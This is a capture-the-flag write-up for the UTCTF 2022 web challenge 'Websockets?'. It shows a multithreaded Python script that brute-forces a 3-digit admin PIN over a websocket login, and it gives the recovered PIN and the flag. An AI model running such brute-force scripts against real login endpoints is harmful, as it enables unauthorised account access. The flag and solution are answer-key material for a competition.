---
date: "2022-03-15T00:00:00Z"
points: 335
redirect_from: /writeups/2022/UTCTF/Websockets.html
solves: 173
tags: [websocket,authentication,bruteforcing]
title: '[Writeup] UTCTF 2022 | Websockets?'
---

![](/assets/CTFs/UTCTF2022/Websockets/challenge_info.png){: .modal}

**Websockets?** was a challenge in the web category for UTCTF 2022, in the end it has {{ page.solves }} Solves and it was worth {{ page.points }} Points. It was relatively easy.

We find this website without much information or input, checking its source we find a new page `/internal/login` and a username `admin`.
Going to this we now see a login, it requires a username and password. Lets open its source and see what we can find. There is a comment it says the following

```html
<!-- what is this garbage, you ask? Well, most of our pins are now 16 digits, but we still have some old 3-digit pins left because tom is a moron and can't remember jack -->
```

So the password will be 3 diget's long? So it will have a range from `000` to `999`.

There also is a JavaScript file, opening it shows us something interesting. The login uses websockets to verify the password, we can easily bruteforce it.
Lets write a small script using python.

```python
#!/usr/bin/env python3

import asyncio
import websockets
from concurrent.futures import ThreadPoolExecutor

URL = 'ws://web1.utctf.live:8651/internal/ws'
PINLENGTH = 3
USERNAME = 'admin'

async def tryLoginWith(pin):
    async with websockets.connect(URL) as websocket:
        begin = await websocket.recv()
        if begin == 'begin':
            await websocket.send(f'begin')
            await websocket.send(f'user {USERNAME}')
            await websocket.send(f'pass {pin}')

            data = await websocket.recv()
            if 'session' in data:
                print(f'[<<<] Data: {data} | Pincode: {pin}')
            else:
                print(f'[-] Wrong Pincode: {pin}')

def send(args):
    asyncio.run(tryLoginWith(str(args).zfill(PINLENGTH)))

args = [ x for x in range(1000) ]
with ThreadPoolExecutor(max_workers=100) as pool:
    pool.map(send,args)

```
^ A download for this script can be found [here](/assets/CTFs/UTCTF2022/Websockets/solve.py)


This code uses multithreading to get the correct pincode as quickly as possible. It also makes sure that the pincode is padded with zero's in front. Running this results in the following output.

![](/assets/CTFs/UTCTF2022/Websockets/pincode_done.png){: .modal}

The pincode it found is `907`.
Lets login with this acquired pincode, and we got the flag! **utflag{w3bsock3ts}**
